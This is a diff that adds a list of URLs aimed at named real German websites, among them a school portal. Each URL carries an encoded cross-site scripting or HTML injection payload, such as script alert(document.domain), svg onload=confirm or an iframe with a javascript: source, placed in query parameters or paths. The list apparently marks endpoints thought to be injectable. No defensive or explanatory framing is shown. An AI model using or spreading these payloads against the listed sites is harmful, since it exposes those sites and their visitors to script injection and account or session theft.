@@ -1,0 +1,11 @@
+http://glas-shredder.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+http://glumo.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+http://gofair.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://go-fun24.de?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+https://gobopro.de/crea_modelli.php?T_PHPR_DB_HOST=localhost&T_PHPR_DB_NAME=%C2%9E%C3%A9e&T_PHPR_DB_PASS=%C2%9E%C3%A9e&T_PHPR_DB_PORT=5432&T_PHPR_DB_TYPE=postgresql&T_PHPR_DB_USER=%C2%9E%C3%A9e&T_PHPR_LOAD_EXT=NO&T_PHPR_TAB_PRE=%C2%9E%C3%A9e&anno=2021&anno_modello=2021&cambia_frasi=SIipq85%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ef9xkbujgt24&fonte_dati_conn=attuali&form_availability_calendar_template=1&id_sessione&lingua_modello=en
+https://goch-lokal.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+https://goeppingen-hier.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://goerlitz-lokal.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
+https://goeschenhaus.de/descriptorByName/AuditTrailPlugin/regexCheck?value=*j%3Ch1%3Esample
+https://goethe-gymnasium-bifiz.schul-webportal.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://go-itservice.de/index.php?id=1%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&r=students/guardians/create
